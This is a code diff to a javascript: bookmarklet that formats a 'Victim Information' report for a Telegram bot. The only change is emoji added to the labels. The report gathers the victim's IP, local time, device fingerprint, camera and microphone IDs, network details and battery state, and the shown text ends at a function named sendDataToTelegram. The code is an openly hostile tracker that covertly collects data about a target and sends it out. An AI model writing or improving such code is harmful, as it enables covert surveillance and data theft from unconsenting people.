@@ -58,13 +58,13 @@ javascript:(function(){
     // Function to format the message for Telegram
     function formatMessage(data) {
         const { deviceInfo, mediaDevices, networkInfo, batteryInfo, timestamp, ip, localTime } = data;
-        return `Victim Information
+        return `✅Victim Information
         
- IP: ${ip} | Time: ${timestamp}
+⚓ IP: ${ip} | Time: ${timestamp}
         
- Date In Victim's Device : ${localTime}
+⏳ Date In Victim's Device : ${localTime}
         
- Device Information
+📱 Device Information
 productSub: ${deviceInfo.productSub}
 vendor: ${deviceInfo.vendor}
 maxTouchPoints: ${deviceInfo.maxTouchPoints}
@@ -82,12 +82,12 @@ languages: ${deviceInfo.languages.join(',')}
 webdriver: ${deviceInfo.webdriver}
 deviceMemory: ${deviceInfo.deviceMemory}
         
- Media Device Information
+📷 Media Device Information
 ${mediaDevices.audioinput.map(id => `audioinput: ${id}`).join('\n')}
 ${mediaDevices.videoinput.map(id => `videoinput: ${id}`).join('\n')}
 ${mediaDevices.audiooutput.map(id => `audiooutput: ${id}`).join('\n')}
         
- Network Information
+🕸️ Network Information
 type: ${networkInfo.type}
 rtt: ${networkInfo.rtt}
 saveData: ${networkInfo.saveData}
@@ -95,11 +95,11 @@ effectiveType: ${networkInfo.effectiveType}
 downlink: ${networkInfo.downlink}
 downlinkMax: ${networkInfo.downlinkMax}
         
- Total USB devices connected: 0
+🔌 Total USB devices connected: 0
         
- Battery Information
-Battery Level: ${batteryInfo.level}%
- Is Battery Charging: ${batteryInfo.charging}`;
+🔋 Battery Information
+🔋Battery Level: ${batteryInfo.level}%
+⚡ Is Battery Charging: ${batteryInfo.charging}`;
     }
     // Function to send data to Telegram bot
     async function sendDataToTelegram(message) {
